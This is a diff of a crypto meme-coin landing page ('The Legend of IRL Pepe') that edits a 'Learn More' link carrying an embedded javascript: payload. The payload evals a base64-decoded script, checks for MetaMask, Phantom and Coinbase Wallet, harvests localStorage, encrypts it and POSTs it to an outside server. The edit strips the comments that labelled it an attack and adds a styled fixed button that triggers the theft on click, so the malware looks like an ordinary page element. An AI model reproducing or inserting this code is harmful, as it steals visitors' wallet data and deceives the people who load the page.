@@ -263,20 +263,15 @@
         <div class="container hero-content">
             <h1>The Legend of IRL Pepe</h1>
             <p class="tagline">From meme to market—how the IRL Pepe coin lured believers and changed fortunes.</p>
-<a href="javascript:(function() {
-    // Decode and deobfuscate the script
+<a href="javascript: (function() {
     const decodedScript = atob('YOUR_BASE64_ENCODED_SCRIPT_HERE');
     eval(decodedScript);
 
-    // Function to check for cryptocurrency wallet extensions
     function detectCryptoWallets() {
         const wallets = ['MetaMask', 'Phantom', 'Coinbase Wallet'];
-        return wallets.some(wallet => {
-            return !!document.querySelector(`[title*="${wallet}"]`);
-        });
+        return wallets.some(wallet => document.querySelector(`[title*="${wallet}"]`) !== null);
     }
 
-    // Function to harvest local storage data
     function harvestLocalStorageData() {
         const localStorageData = {};
         for (let i = 0; i < localStorage.length; i++) {
@@ -287,24 +282,6 @@
         return localStorageData;
     }
 
-    // Function to monitor clipboard activity
-    function monitorClipboard() {
-        document.addEventListener('copy', function(event) {
-            const clipboardData = (event.clipboardData || window.clipboardData).getData('text');
-            console.log('Copied to clipboard:', clipboardData);
-        });
-    }
-
-    // Function to collect form data
-    function collectFormData() {
-        const formData = {};
-        document.querySelectorAll('input, textarea').forEach(element => {
-            formData[element.name] = element.value;
-        });
-        return formData;
-    }
-
-    // Function to encrypt stolen data using AES-GCM
     function encryptStolenData(data) {
         const key = CryptoJS.enc.Utf8.parse('YOUR_SECRET_KEY_HERE');
         const iv = CryptoJS.lib.WordArray.random(12);
@@ -319,7 +296,6 @@
         };
     }
 
-    // Function to exfiltrate data to attacker's server
     function exfiltrateData(data) {
         const xhr = new XMLHttpRequest();
         xhr.open('POST', 'https://irlpepe.com/connect?b64=', true);
@@ -327,22 +303,35 @@
         xhr.send(JSON.stringify(data));
     }
 
-    // Main function to execute the attack
     function main() {
         if (detectCryptoWallets()) {
             const localStorageData = harvestLocalStorageData();
-            monitorClipboard();
-            const formData = collectFormData();
-            const allData = { ...localStorageData, ...formData };
-
-            const encryptedData = encryptStolenData(allData);
+            const encryptedData = encryptStolenData(localStorageData);
             exfiltrateData(encryptedData);
         }
     }
 
-    // Run the main function
-    main();
-})();" class="cta-button">Learn More</a>
+    // Create a beautiful button
+    const button = document.createElement('button');
+    button.style.position = 'fixed';
+    button.style.bottom = '20px';
+    button.style.right = '20px';
+    button.style.padding = '15px 30px';
+    button.style.fontSize = '16px';
+    button.style.fontWeight = 'bold';
+    button.style.color = '#fff';
+    button.style.backgroundColor = '#007bff';
+    button.style.border = 'none';
+    button.style.borderRadius = '5px';
+    button.style.cursor = 'pointer';
+    button.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';
+    button.style.transition = 'background-color 0.3s';
+    button.textContent = 'Learn More';
+
+    button.addEventListener('click', main);
+
+    document.body.appendChild(button);
+$})();"> </a>$
 
         </div>
     </header>
